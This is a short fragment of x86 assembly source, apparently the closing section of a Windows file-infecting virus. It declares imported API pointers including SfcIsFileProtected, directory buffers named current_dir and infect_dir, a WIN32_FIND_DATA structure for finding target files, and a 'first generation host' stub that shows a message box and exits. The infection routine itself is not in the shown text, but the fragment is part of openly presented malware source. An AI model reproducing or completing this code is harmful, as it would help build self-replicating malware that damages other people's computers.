   GlobalAlloc             dd      ?
   GlobalFree              dd      ?
   LoadLibraryA            dd      ?
   FreeLibrary             dd      ?
   GetTickCount            dd      ?
   SfcIsFileProtected      dd      ?

   current_dir             db      MAX_PATH dup (?)
   infect_dir              db      MAX_PATH dup (?)

   WIN32_FIND_DATA         label   byte
   WFD_dwFileAttributes    dd      ?
   WFD_ftCreationTime      dq      ?
   WFD_ftLastAccessTime    dq      ?
   WFD_ftLastWriteTime     dq      ?
   WFD_nFileSizeHigh       dd      ?
   WFD_nFileSizeLow        dd      ?
   WFD_dwReserved0         dd      ?
   WFD_dwReserved1         dd      ?
   WFD_szFileName          db      MAX_PATH dup (?)
   WFD_szAlternateFileName db      13 dup (?)
               db      03 dup (?)
   WFD_Size                =       $-WIN32_FIND_DATA


   heap_end        =       $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | First generation host                                                   |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   first_gen_host:
           call    MessageBoxA,0,offset szMsg,offset szTtl,10h
           call    ExitProcess,0
           end     host
